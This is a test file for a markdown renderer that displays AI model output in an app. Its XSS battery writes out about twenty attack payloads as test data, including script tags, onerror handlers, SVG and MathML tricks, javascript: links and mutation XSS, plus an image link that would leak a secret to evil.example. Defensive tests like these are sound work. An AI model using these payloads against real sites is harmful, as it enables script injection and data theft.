import { describe, expect, it } from 'vitest';
import { critiqueMarkdown, renderMarkdown } from './markdown';

/** Render into a detached DOM tree and return it for structural assertions. */
function dom(src: string): HTMLElement {
  const div = document.createElement('div');
  div.innerHTML = renderMarkdown(src);
  return div;
}

const EVENT_ATTR = /^on/i;

function assertInert(root: HTMLElement): void {
  for (const el of root.querySelectorAll('*')) {
    for (const attr of el.attributes) {
      expect(EVENT_ATTR.test(attr.name), `${el.tagName} has ${attr.name}`).toBe(false);
      expect(/^\s*(javascript|data|vbscript):/i.test(attr.value), `${el.tagName}[${attr.name}]=${attr.value}`).toBe(false);
    }
  }
  expect(root.querySelector('script, iframe, object, embed, svg, math, img, style, form, input, button, video, audio')).toBeNull();
}

describe('renderMarkdown: formatting', () => {
  it('renders GFM (tables, lists, code, emphasis)', () => {
    const root = dom('# Títol\n\n**negreta** i `codi`\n\n- a\n- b\n\n| x | y |\n|---|---|\n| 1 | 2 |\n\n```python\nprint(1)\n```');
    expect(root.querySelector('h1')?.textContent).toBe('Títol');
    expect(root.querySelector('strong')?.textContent).toBe('negreta');
    expect(root.querySelectorAll('li')).toHaveLength(2);
    expect(root.querySelector('table td')?.textContent).toBe('1');
    expect(root.querySelector('pre code.language-python')?.textContent).toBe('print(1)\n');
  });

  it('opens safe links in a new tab without referrer', () => {
    const a = dom('[docs](https://example.com "t")').querySelector('a');
    expect(a?.getAttribute('href')).toBe('https://example.com');
    expect(a?.getAttribute('target')).toBe('_blank');
    expect(a?.getAttribute('rel')).toBe('noopener noreferrer nofollow');
    expect(a?.getAttribute('referrerpolicy')).toBe('no-referrer');
  });

  it('keeps mailto links and autolinks', () => {
    const root = dom('[mail](mailto:a@b.c) i https://example.org');
    const hrefs = [...root.querySelectorAll('a')].map((a) => a.getAttribute('href'));
    expect(hrefs).toEqual(['mailto:a@b.c', 'https://example.org']);
  });

  it('returns an empty string for empty input', () => {
    expect(renderMarkdown('')).toBe('');
  });
});

describe('renderMarkdown: XSS battery', () => {
  const vectors: [string, string][] = [
    ['script tag', '<script>alert(1)</script>'],
    ['img onerror', '<img src=x onerror=alert(1)>'],
    ['svg onload', '<svg onload=alert(1)><circle r=1 /></svg>'],
    ['svg inside a list', '- <svg><a xlink:href="javascript:alert(1)"><text>x</text></a></svg>'],
    ['mathml', '<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>'],
    ['iframe', '<iframe src="https://evil.example"></iframe>'],
    ['details ontoggle', '<details open ontoggle=alert(1)>x</details>'],
    ['javascript link', '[click](javascript:alert(1))'],
    ['mixed-case javascript link', '[click](JaVaScRiPt:alert(1))'],
    ['entity-encoded javascript', '[click](&#106;avascript:alert(1))'],
    ['whitespace javascript', '[click]( javascript:alert(1))'],
    ['data url link', '[data](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)'],
    ['vbscript link', '[x](vbscript:msgbox(1))'],
    ['raw anchor', '<a href="javascript:alert(1)">raw</a>'],
    ['reference link', '[x][1]\n\n[1]: javascript:alert(1)'],
    ['image javascript', '![alt](javascript:alert(1))'],
    ['style tag', '<style>body{background:url(https://evil.example/x)}</style>'],
    ['form', '<form action="https://evil.example"><button>go</button></form>'],
    ['mutation xss', '<noscript><p title="</noscript><img src=x onerror=alert(1)>">'],
    ['code fence lang injection', '```js" onmouseover="alert(1)\ncode\n```'],
    ['table cell html', '| a |\n|---|\n| <img src=x onerror=alert(1)> |'],
  ];

  for (const [name, src] of vectors) {
    it(`neutralizes ${name}`, () => assertInert(dom(src)));
  }

  it('shows raw HTML as text instead of interpreting it', () => {
    const root = dom('<b>hola</b>');
    expect(root.querySelector('b')).toBeNull();
    expect(root.textContent).toContain('<b>hola</b>');
  });

  it('turns images into links so nothing loads (no exfiltration)', () => {
    const root = dom('![secret](https://evil.example/?q=SECRET)');
    expect(root.querySelector('img')).toBeNull();
    const a = root.querySelector('a');
    expect(a?.textContent).toBe('Imatge: secret');
    expect(a?.getAttribute('href')).toBe('https://evil.example/?q=SECRET');
    expect(a?.getAttribute('rel')).toContain('noreferrer');
  });

  it('drops unsafe hrefs but keeps the link text', () => {
    const root = dom('[click](javascript:alert(1))');
    expect(root.textContent).toContain('click');
    for (const a of root.querySelectorAll('a')) expect(a.hasAttribute('href')).toBe(false);
  });

  it('drops relative and fragment links (no in-app navigation from model output)', () => {
    const root = dom('[a](/api/auth/logout) [b](#/tauler)');
    for (const a of root.querySelectorAll('a')) expect(a.hasAttribute('href')).toBe(false);
  });

  it('strips inline styles, ids and data attributes', () => {
    const root = dom('[x](https://a.b)');
    const a = root.querySelector('a')!;
    expect(a.hasAttribute('style')).toBe(false);
    expect(a.hasAttribute('id')).toBe(false);
  });
});

describe('critiqueMarkdown', () => {
  it('keeps existing lists', () => {
    expect(critiqueMarkdown('- a\n- b')).toBe('- a\n- b');
    expect(critiqueMarkdown('1. a\n2. b')).toBe('1. a\n2. b');
  });

  it('turns plain lines into bullets', () => {
    expect(critiqueMarkdown('Primer punt\nSegon punt')).toBe('- Primer punt\n- Segon punt');
  });

  it('leaves a single sentence as is', () => {
    expect(critiqueMarkdown('  Tot correcte.  ')).toBe('Tot correcte.');
  });
});
